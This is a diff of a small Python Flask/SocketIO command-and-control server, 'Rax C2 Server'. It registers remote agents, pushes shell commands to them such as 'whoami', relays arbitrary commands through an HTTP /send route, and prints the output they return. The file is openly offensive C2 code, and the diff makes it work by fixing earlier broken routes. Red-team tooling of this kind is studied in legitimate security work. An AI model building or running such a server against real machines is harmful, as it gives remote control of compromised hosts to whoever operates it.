@@ -7,7 +7,7 @@ from flask_socketio import SocketIO, emit  # SocketIO for real-time communicatio
 import pyfiglet
 
 # --- ASCII Banner ---
-# Banner for a Rax C2 Server file
+# Banner for a Rax C2 Server file - ✅
 ascii_banner = pyfiglet.figlet_format("Rax - C2 - Server")
 print(ascii_banner)
 print("By - @mello-io")
@@ -19,6 +19,7 @@ socketio = SocketIO(app)  # Create a SocketIO server
 agents = {}  # Dictionary to keep track of agents (agent_id : IP)
 agent_sid = None  # Global var to store agent session ID
 
+# --- Agent Registration --- ✅
 @app.route('/register', methods=['POST'])
 def register():
     # Called when an agent sends a POST request to register
@@ -28,44 +29,51 @@ def register():
     print(f"[+] Agent {agent_id} registered from {ip}")
     return {"status": "registered"}
 
+# --- Getting data back from the agent - ✅
 @socketio.on('exec_result')
 def handle_result(data):
     # Handle incoming command output from the agent
-#    print(f"[{data['id']}] Output:\n{data['output']}")
     print(f"[Agent Output] {data['output']}")    
 
+# Connecting with the agent - ✅
 @socketio.on('connect')
 def handle_connect():
-    print("[+] Agent connected:", request.sid)
     # Called when an agent connects
-
-#    agent_sessions[request.sid] = request.sid
-#    agent_sessions['latest'] = request.sid
     global agent_sid
     agent_sid = request.sid
     print("[+] Agent connected:", agent_sid)
 
     # Test: send command directly to agent
-    socketio.emit('command', "whoami", room=agent_sid)    
+    print("[+] Sending Hardcoded Test commands")
+    socketio.emit('command', "whoami", room=agent_sid)
+    # socketio.emit('command',"ipconfig",room=agent_sid)
 
-if __name__ == "__main__":
-    # Start the SocketIO server with SSL support
-    # Make sure cert.pem and key.pem are in the same folder
-    socketio.run(app, host='0.0.0.0', port=5000)#, ssl_context=('cert.pem', 'key.pem'))
 
 # === HTTP Route to Send Commands ===
-@app.route('/send/sid', methods=['POST'])
-def send_command(agent_id):
+
+# === Single agent operation - ✅ ===
+@app.route('/send', methods=['GET','POST'])
+def send():
+    global agent_sid
     data = request.get_json()
     cmd = data.get('cmd')
-    if agent_id in agent_sessions:
-        socketio.emit('command', cmd, room=sid)
-        print(f"[>] Sent command: {cmd} to agent {sid}")
-        return jsonify({"status": "command sent"}), 200
-    else:
-        return jsonify({"error": "Agent not found"}), 404
 
-@sio.on('output')
-def handle_output(sid, data):
-    print(f"[{sid}] Output:\n{data}")
-                                                
+    print(f"[DEBUG] Incoming command via HTTP: {cmd}")
+    print(f"[DEBUG] Current agent SID: {agent_sid}")
+
+    if agent_sid:
+        socketio.emit('command', cmd, room=agent_sid)
+        print(f"[>] Sent command: {cmd} to agent {agent_sid}")
+        return {"status": "command sent"}, 200
+    else:
+        return {"error": "Agent not found"}, 404
+
+# === Multiple agent operation - ⚒️ Research & Develop ===
+
+
+
+# --- Main Server Running on open 5000 port - Testing = ✅
+if __name__ == "__main__":
+    # Start the SocketIO server with SSL support - ⚠️
+    # Make sure cert.pem and key.pem are in the same folder - Need additional research ⚒️⚠️
+    socketio.run(app, host='0.0.0.0', port=5000)#, ssl_context=('cert.pem', 'key.pem'))
